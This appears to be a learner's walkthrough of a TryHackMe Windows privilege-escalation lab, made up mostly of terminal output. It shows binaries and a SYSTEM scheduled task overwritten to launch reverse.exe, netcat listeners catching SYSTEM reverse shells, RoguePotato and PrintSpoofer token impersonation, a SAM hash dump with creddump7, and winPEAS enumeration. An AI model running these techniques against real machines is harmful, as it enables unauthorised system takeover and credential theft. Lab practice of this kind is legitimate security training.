https://tryhackme.com/room/windows10privesc

## Registry - AutoRuns

```
C:\Users\user>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
    My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"


C:\Users\user>C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

AccessChk v4.02 - Check access of files, keys, objects, processes or services
Copyright (C) 2006-2007 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\Autorun Program\program.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
        FILE_ALL_ACCESS
  RW BUILTIN\Users
        FILE_ALL_ACCESS

C:\Users\user>copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
        1 file(s) copied.

C:\Users\user>
```

```
┌──(kali㉿kali)-[/tmp]
└─$ nc -nlvp 4444                                                                                                                                                 130 ⨯
listening on [any] 4444 ...
connect to [10.8.52.126] from (UNKNOWN) [10.10.163.32] 49799
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
whoami
win-qba94kb3iof\admin

C:\Windows\system32>
```


### Passwords - Security Account Manager (SAM)

```
┌──(kali㉿kali)-[/tmp]
└─$ git clone https://github.com/Tib3rius/creddump7
pip3 install pycrypto
Cloning into 'creddump7'...
remote: Enumerating objects: 107, done.
remote: Counting objects: 100% (5/5), done.
remote: Compressing objects: 100% (5/5), done.
remote: Total 107 (delta 0), reused 1 (delta 0), pack-reused 102
Receiving objects: 100% (107/107), 51.65 KiB | 3.04 MiB/s, done.
Resolving deltas: 100% (55/55), done.
Requirement already satisfied: pycrypto in /home/kali/.local/lib/python3.9/site-packages (2.6.1)
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 creddump7/pwdump.py SYSTEM SAM
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6ebaa6d5e6e601996eefe4b6048834c2:::
user:1000:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

### Scheduled Tasks

```
C:\Users\user>type C:\DevTools\CleanUp.ps1
# This script will clean up all your old dev logs every minute.
# To avoid permissions issues, run as SYSTEM (should probably fix this later)

Remove-Item C:\DevTools\*.log

C:\Users\user>C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
RW C:\DevTools\CleanUp.ps1
        FILE_ADD_FILE
        FILE_ADD_SUBDIRECTORY
        FILE_APPEND_DATA
        FILE_EXECUTE
        FILE_LIST_DIRECTORY
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_READ_EA
        FILE_TRAVERSE
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA
        FILE_WRITE_EA
        DELETE
        SYNCHRONIZE
        READ_CONTROL

C:\Users\user>echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1

C:\Users\user>
```

```
┌──(kali㉿kali)-[/tmp]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.52.126] from (UNKNOWN) [10.10.163.32] 49869
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

```

## Insecure GUI Apps

![](Pasted%20image%2020220109180825.png)

![](Pasted%20image%2020220109180905.png)

## Startup Apps

```
C:\Users\user>C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

AccessChk v4.02 - Check access of files, keys, objects, processes or services
Copyright (C) 2006-2007 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW WIN-QBA94KB3IOF\Administrator
  RW WIN-QBA94KB3IOF\admin
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
  R  Everyone

C:\Users\user>cscript C:\PrivEsc\CreateShortcut.vbs
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.


C:\Users\user>
```

```
┌──(kali㉿kali)-[/tmp]
└─$ rdesktop -u administrator -p password123 10.10.163.32 -r disk:linux=/tmp 
```

```
┌──(kali㉿kali)-[/tmp]
└─$ nc -nlvp 4444                                                                                                                                                       
listening on [any] 4444 ...
connect to [10.8.52.126] from (UNKNOWN) [10.10.163.32] 49957
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

```

## Token Impersonation - Rogue Potato
```
┌──(kali㉿kali)-[~]
└─$ sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.46.254:9999                                                                                                130 ⨯




```

```
C:\Windows\system32>C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe -accepteula
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe -accepteula

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com



```

```
C:\Windows\system32>C:\PrivEsc\RoguePotato.exe -r 10.8.52.126 -e "C:\PrivEsc\reverse.exe" -l 9999
C:\PrivEsc\RoguePotato.exe -r 10.8.52.126 -e "C:\PrivEsc\reverse.exe" -l 9999
[+] Starting RoguePotato...
[*] Creating Rogue OXID resolver thread
[*] Creating Pipe Server thread..
[*] Creating TriggerDCOM thread...
[*] Listening on pipe \\.\pipe\RoguePotato\pipe\epmapper, waiting for client to connect
[*] Calling CoGetInstanceFromIStorage with CLSID:{4991d34b-80a1-4291-83b6-3328366b9097}
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ... 
[*] IStoragetrigger written:104 bytes
[*] SecurityCallback RPC call
[*] ServerAlive2 RPC Call
[*] SecurityCallback RPC call
[*] ResolveOxid2 RPC call, this is for us!
[*] ResolveOxid2: returned endpoint binding information = ncacn_np:localhost/pipe/RoguePotato[\pipe\epmapper]
[*] Client connected!
[+] Got SYSTEM Token!!!
[*] Token has SE_ASSIGN_PRIMARY_NAME, using CreateProcessAsUser() for launching: C:\PrivEsc\reverse.exe
[+] RoguePotato gave you the SYSTEM powerz :D

C:\Windows\system32>

```

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4444                                                                                                                                                   1 ⨯
listening on [any] 4444 ...
connect to [10.8.52.126] from (UNKNOWN) [10.10.46.254] 49725
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

```

## Token Impersonation - Print Spoofer

```
C:\Windows\system32>C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe -accepteula
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe -accepteula

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com



```


```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4444                                                                                                                                                   1 ⨯
listening on [any] 4444 ...
connect to [10.8.52.126] from (UNKNOWN) [10.10.46.254] 49696
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\local service

C:\Windows\system32>C:\PrivEsc\RoguePotato.exe -r 10.8.52.126 -e "C:\PrivEsc\reverse.exe" -l 9999
C:\PrivEsc\RoguePotato.exe -r 10.8.52.126 -e "C:\PrivEsc\reverse.exe" -l 9999
[+] Starting RoguePotato...
[*] Creating Rogue OXID resolver thread
[*] Creating Pipe Server thread..
[*] Creating TriggerDCOM thread...
[*] Listening on pipe \\.\pipe\RoguePotato\pipe\epmapper, waiting for client to connect
[*] Calling CoGetInstanceFromIStorage with CLSID:{4991d34b-80a1-4291-83b6-3328366b9097}
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ... 
[*] IStoragetrigger written:104 bytes
[-] Named pipe didn't received any connect request. Exiting ... 

C:\Windows\system32>C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -iC:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK



```

```

┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.52.126] from (UNKNOWN) [10.10.46.254] 49707
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

```

## Privilege Escalation Scripts

```
C:\Users\user>C:\Privesc\winPEASany.exe 
C:\Privesc\winPEASany.exe 
   Creating Dynamic lists, this could take a while, please wait...
   - Checking if domain...
   - Getting Win32_UserAccount info...
   - Creating current user groups list...
   - Creating active users list...
   - Creating disabled users list...
   - Admin users list...
     
             *((,.,/((((((((((((((((((((/,  */                                                                                                                          
      ,/*,..*((((((((((((((((((((((((((((((((((,                                                                                                                        
    ,*/((((((((((((((((((/,  .*//((//**, .*(((((((*                                                                                                                     
    ((((((((((((((((**********/########## .(* ,(((((((                                                                                                                  
    (((((((((((/********************/####### .(. (((((((                                                                                                                
    ((((((..******************/@@@@@/***/###### ./(((((((                                                                                                               
    ,,....********************@@@@@@@@@@(***,#### .//((((((                                                                                                             
    , ,..********************/@@@@@%@@@@/********##((/ /((((                                                                                                            
    ..((###########*********/%@@@@@@@@@/************,,..((((                                                                                                            
    .(##################(/******/@@@@@/***************.. /((                                                                                                            
    .(#########################(/**********************..*((                                                                                                            
    .(##############################(/*****************.,(((                                                                                                            
    .(###################################(/************..(((                                                                                                            
    .(#######################################(*********..(((                                                                                                            
    .(#######(,.***.,(###################(..***.*******..(((                                                                                                            
    .(#######*(#####((##################((######/(*****..(((                                                                                                            
    .(###################(/***********(##############(...(((                                                                                                            
    .((#####################/*******(################.((((((                                                                                                            
    .(((############################################(..((((                                                                                                             
    ..(((##########################################(..(((((                                                                                                             
    ....((########################################( .(((((                                                                                                              
    ......((####################################( .((((((                                                                                                               
    (((((((((#################################(../((((((                                                                                                                
        (((((((((/##########################(/..((((((                                                                                                                  
              (((((((((/,.  ,*//////*,. ./(((((((((((((((.                                                                                                              
                 (((((((((((((((((((((((((((((/                                                                                                                         

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.                                                             
                                                                                                                                                                        
  WinPEAS vBETA VERSION, Please if you find any issue let me know in https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues by carlospolop    

  [+] Leyend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

   [?] You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation


  ==========================================(System Information)==========================================

  [+] Basic System Information(T1082&T1124&T1012&T1497&T1212)
   [?] Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits
    Hostname: WIN-QBA94KB3IOF
    ProductName: Windows Server 2019 Standard Evaluation
    EditionID: ServerStandardEval
    ReleaseId: 1809
    BuildBranch: rs5_release
    CurrentMajorVersionNumber: 10
    CurrentVersion: 6.3
    Architecture: AMD64
    ProcessorCount: 1
    SystemLang: en-US
    KeyboardLang: English (United States)
    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
    IsVirtualMachine: False
    Current Time: 1/9/2022 2:14:24 AM
    HighIntegrity: False
    PartOfDomain: False
    Hotfixes: KB4514366, KB4512577, KB4512578, 

  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
    OS Build Number: 17763
       [!] CVE-2019-1315 : VULNERABLE
        [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html

       [!] CVE-2019-1385 : VULNERABLE
        [>] https://www.youtube.com/watch?v=K6gHnr-VkAg

       [!] CVE-2019-1388 : VULNERABLE
        [>] https://github.com/jas502n/CVE-2019-1388

       [!] CVE-2019-1405 : VULNERABLE
        [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/                                                                                                                            

    Finished. Found 4 potential vulnerabilities.

  [+] PowerShell Settings()
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 

  [+] Audit Settings(T1012)
   [?] Check what is being logged 
    Not Found

  [+] WEF Settings(T1012)
   [?] Windows Event Forwarding, is interesting to know were are sent the logs 
    Not Found

  [+] LAPS Settings(T1012)
   [?] If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: LAPS not installed

  [+] Wdigest()
   [?] If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#wdigest
    Wdigest is not enabled

  [+] LSA Protection()
   [?] If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection                                                                                                   
    LSA Protection is not enabled

  [+] Credentials Guard()
   [?] If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#credential-guard
    CredentialGuard is not enabled

  [+] Cached Creds()
   [?] If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#cached-credentials                                                                                                                                                     
    cachedlogonscount is 10

  [+] User Environment Variables()
   [?] Check for some passwords or keys in the env variables 
    COMPUTERNAME: WIN-QBA94KB3IOF
    USERPROFILE: C:\Users\user
    HOMEPATH: \Users\user
    LOCALAPPDATA: C:\Users\user\AppData\Local
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    PROCESSOR_ARCHITECTURE: AMD64
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;;C:\Temp;C:\Users\user\AppData\Local\Microsoft\WindowsApps;
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
    PROCESSOR_LEVEL: 6
    LOGONSERVER: \\WIN-QBA94KB3IOF
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    HOMEDRIVE: C:
    SystemRoot: C:\Windows
    SESSIONNAME: RDP-Tcp#2
    ALLUSERSPROFILE: C:\ProgramData
    DriverData: C:\Windows\System32\Drivers\DriverData
    APPDATA: C:\Users\user\AppData\Roaming
    PROCESSOR_REVISION: 4f01
    USERNAME: user
    CommonProgramW6432: C:\Program Files\Common Files
    CommonProgramFiles: C:\Program Files\Common Files
    CLIENTNAME: kali
    OS: Windows_NT
    USERDOMAIN_ROAMINGPROFILE: WIN-QBA94KB3IOF
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
    ComSpec: C:\Windows\system32\cmd.exe
    PROMPT: $P$G
    SystemDrive: C:
    TEMP: C:\Users\user\AppData\Local\Temp\2
    ProgramFiles: C:\Program Files
    NUMBER_OF_PROCESSORS: 1
    TMP: C:\Users\user\AppData\Local\Temp\2
    ProgramData: C:\ProgramData
    ProgramW6432: C:\Program Files
    windir: C:\Windows
    USERDOMAIN: WIN-QBA94KB3IOF
    PUBLIC: C:\Users\Public

  [+] System Environment Variables()
   [?] Check for some passwords or keys in the env variables 
    ComSpec: C:\Windows\system32\cmd.exe
    DriverData: C:\Windows\System32\Drivers\DriverData
    OS: Windows_NT
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;;C:\Temp
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PROCESSOR_ARCHITECTURE: AMD64
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    TEMP: C:\Windows\TEMP
    TMP: C:\Windows\TEMP
    USERNAME: SYSTEM
    windir: C:\Windows
    NUMBER_OF_PROCESSORS: 1
    PROCESSOR_LEVEL: 6
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
    PROCESSOR_REVISION: 4f01

  [+] HKCU Internet Settings(T1012)
    DisableCachingOfSSLPages: 1
    IE5_UA_Backup_Flag: 5.0
    PrivacyAdvanced: 1
    SecureProtocols: 2688
    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
    CertificateRevocation: 1
    ZonesSecurityUpgrade: System.Byte[]
    WarnonZoneCrossing: 1
    EnableNegotiate: 1
    MigrateProxy: 1
    ProxyEnable: 0

  [+] HKLM Internet Settings(T1012)
    ActiveXCache: C:\Windows\Downloaded Program Files
    CodeBaseSearchPath: CODEBASE
    EnablePunycode: 1
    MinorVersion: 0
    WarnOnIntranet: 1

  [+] Drives Information(T1120)
   [?] Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 29 GB)(Permissions: Users [AppendData/CreateDirectories])

  [+] AV Information(T1063)
  [X] Exception: Invalid namespace 
    No AV was detected!!
    Not Found

  [+] UAC Status(T1012)
   [?] If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access                                                                                                                                                       
    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
    EnableLUA: 1
    LocalAccountTokenFilterPolicy: 1
    FilterAdministratorToken: 
      [*] LocalAccountTokenFilterPolicy set to 1.
      [+] Any local account can be used for lateral movement.                                                                                                           


  ===========================================(Users Information)===========================================

  [+] Users(T1087&T1069&T1033)
   [?] Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups
  Current user: user
  Current groups: Domain Users, Everyone, Users, Builtin\Remote Desktop Users, Remote Interactive Logon, Interactive, Authenticated Users, This Organization, Local account, Local, NTLM Authentication
   =================================================================================================

    WIN-QBA94KB3IOF\admin
        |->Groups: Administrators,Users
        |->Password: CanChange-Expi-Req

    WIN-QBA94KB3IOF\Administrator(Disabled): Built-in account for administering the computer/domain
        |->Groups: Administrators
        |->Password: CanChange-NotExpi-Req

    WIN-QBA94KB3IOF\DefaultAccount(Disabled): A user account managed by the system.
        |->Groups: System Managed Accounts Group
        |->Password: CanChange-NotExpi-NotReq

    WIN-QBA94KB3IOF\Guest(Disabled): Built-in account for guest access to the computer/domain
        |->Groups: Guests
        |->Password: NotChange-NotExpi-NotReq

    WIN-QBA94KB3IOF\user
        |->Groups: Users
        |->Password: CanChange-Expi-Req

    WIN-QBA94KB3IOF\WDAGUtilityAccount(Disabled): A user account managed and used by the system for Windows Defender Application Guard scenarios.
        |->Password: CanChange-Expi-Req


  [+] Current Token privileges(T1134)
   [?] Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#token-manipulation
    SeShutdownPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED

  [+] Clipboard text(T1134)
    Not Found
    [i]     This C# implementation to capture the clipboard is not trustable in every Windows version
    [i]     If you want to see what is inside the clipboard execute 'powershell -command "Get - Clipboard"'

  [+] Logged users(T1087&T1033)
    WIN-QBA94KB3IOF\admin
    WIN-QBA94KB3IOF\user

  [+] RDP Sessions(T1087&T1033)
    SessID    pSessionName   pUserName      pDomainName              State     SourceIP
    2         RDP-Tcp#14     user           WIN-QBA94KB3IOF          Active    10.8.52.126

  [+] Ever logged users(T1087&T1033)
    WIN-QBA94KB3IOF\Administrator
    WIN-QBA94KB3IOF\admin
    WIN-QBA94KB3IOF\user

  [+] Looking for AutoLogon credentials(T1012)
    Some AutoLogon credentials were found!!
    DefaultUserName               :  admin

  [+] Home folders found(T1087&T1083&T1033)
    C:\Users\admin
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\Public : Interactive [WriteData/CreateFiles]
    C:\Users\user

  [+] Password Policies(T1201)
   [?] Check for a possible brute-force 
  [X] Exception: System.OverflowException: Negating the minimum value of a twos complement number is invalid.
   at System.TimeSpan.op_UnaryNegation(TimeSpan t)                                                                                                                      
   at d7.d()                                                                                                                                                            
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================



  =======================================(Processes Information)=======================================

  [+] Interesting Processes -non Microsoft-(T1010&T1057&T1007)
   [?] Check if any interesting proccesses for memmory dump or if you could overwrite some binary running https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes                                                                                                                                              
    winPEASany(5316)[C:\Privesc\winPEASany.exe] -- POwn: user -- isDotNet
    Possible DLL Hijacking folder: C:\Privesc (Users [AppendData/CreateDirectories WriteData/CreateFiles])
    Command Line: C:\Privesc\winPEASany.exe  
   =================================================================================================

    cmd(5512)[C:\Windows\SYSTEM32\cmd.exe] -- POwn: user
    Command Line: cmd
   =================================================================================================                                                                    

    cmd(2352)[C:\Windows\System32\cmd.exe]
    Command Line: "C:\Windows\System32\cmd.exe" 
   =================================================================================================                                                                    

    RuntimeBroker(4092)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: user
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    conhost(4088)[C:\Windows\system32\conhost.exe] -- POwn: user
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================

    taskhostw(4676)[C:\Windows\system32\taskhostw.exe] -- POwn: user
    Command Line: taskhostw.exe
   =================================================================================================                                                                    

    ShellExperienceHost(3960)[C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe] -- POwn: user
    Command Line: "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca
   =================================================================================================                                                                    

    RuntimeBroker(728)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: user
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    RuntimeBroker(1312)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: user
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    SearchUI(4064)[C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe] -- POwn: user
    Command Line: "C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca
   =================================================================================================                                                                    

    dllhost(4644)[C:\Windows\system32\DllHost.exe] -- POwn: user
    Command Line: C:\Windows\system32\DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F}
   =================================================================================================

    rdpclip(2832)[C:\Windows\System32\rdpclip.exe] -- POwn: user
    Command Line: rdpclip
   =================================================================================================                                                                    

    taskhostw(1844)[C:\Windows\system32\taskhostw.exe] -- POwn: user
    Command Line: taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
   =================================================================================================                                                                    

    conhost(2804)[C:\Windows\system32\conhost.exe] -- POwn: user
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================

    wuapihost(1188)[C:\Windows\System32\wuapihost.exe] -- POwn: user
    Command Line: C:\Windows\System32\wuapihost.exe -Embedding
   =================================================================================================

    mspaint(2012)[C:\Windows\system32\mspaint.exe]
    Command Line: C:\Windows\system32\mspaint.exe
   =================================================================================================                                                                    

    svchost(824)[C:\Windows\system32\svchost.exe] -- POwn: user
    Command Line: C:\Windows\system32\svchost.exe -k UnistackSvcGroup
   =================================================================================================

    sihost(1992)[C:\Windows\system32\sihost.exe] -- POwn: user
    Command Line: sihost.exe
   =================================================================================================                                                                    

    conhost(3364)[C:\Windows\system32\conhost.exe]
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================

    cmd(3756)[C:\Windows\system32\cmd.exe] -- POwn: user
    Command Line: "C:\Windows\system32\cmd.exe" 
   =================================================================================================                                                                    

    explorer(3556)[C:\Windows\Explorer.EXE] -- POwn: user
    Command Line: C:\Windows\Explorer.EXE
   =================================================================================================                                                                    

    reverse(5124)[C:\PrivEsc\reverse.exe] -- POwn: user
    Possible DLL Hijacking folder: C:\PrivEsc (Users [AppendData/CreateDirectories WriteData/CreateFiles])
    Command Line: C:\PrivEsc\reverse.exe
   =================================================================================================                                                                    



  ========================================(Services Information)========================================

  [+] Interesting Services -non Microsoft-(T1007)
   [?] Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services                                                                                                                                                 
    AmazonSSMAgent(Amazon SSM Agent)["C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"] - Auto - Running
    Amazon SSM Agent
   =================================================================================================                                                                    

    AWSLiteAgent(Amazon Inc. - AWS Lite Guest Agent)[C:\Program Files\Amazon\XenTools\LiteAgent.exe] - Auto - Running - No quotes and Space detected
    AWS Lite Guest Agent
   =================================================================================================                                                                    

    daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] - Manual - Stopped
    YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles
   =================================================================================================

    dllsvc(DLL Hijack Service)["C:\Program Files\DLL Hijack Service\dllhijackservice.exe"] - Manual - Stopped
   =================================================================================================

    filepermsvc(File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped
    File Permissions: Everyone [AllAccess]
   =================================================================================================

    PsShutdownSvc(Systems Internals - PsShutdown)[C:\Windows\PSSDNSVC.EXE] - Manual - Stopped
   =================================================================================================

    regsvc(Insecure Registry Service)["C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"] - Manual - Stopped
   =================================================================================================

    ssh-agent(OpenSSH Authentication Agent)[C:\Windows\System32\OpenSSH\ssh-agent.exe] - Disabled - Stopped
    Agent to hold private keys used for public key authentication.
   =================================================================================================                                                                    

    unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected
   =================================================================================================

    winexesvc(winexesvc)[winexesvc.exe] - Manual - Running
   =================================================================================================


  [+] Modifiable Services(T1007)
   [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
    LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
    daclsvc: WriteData/CreateFiles

  [+] Looking if you can modify any service registry()
   [?] Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions
    HKLM\system\currentcontrolset\services\regsvc (Interactive [TakeOwnership])

  [+] Checking write permissions in PATH folders (DLL Hijacking)()
   [?] Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\
    C:\Windows\System32\OpenSSH\
    C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps
    
    (DLL Hijacking) C:\Temp: Users [AppendData/CreateDirectories WriteData/CreateFiles]


  ====================================(Applications Information)====================================

  [+] Current Active Window Application(T1010&T1518)
    Command Prompt

  [+] Installed Applications --Via Program Files/Uninstall registry--(T1083&T1012&T1010&T1518)
   [?] Check if you can modify installed software https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#software
    C:\Program Files\Amazon
    C:\Program Files\Autorun Program
    C:\Program Files\Common Files
    C:\Program Files\DACL Service
    C:\Program Files\desktop.ini
    C:\Program Files\DLL Hijack Service
    C:\Program Files\File Permissions Service
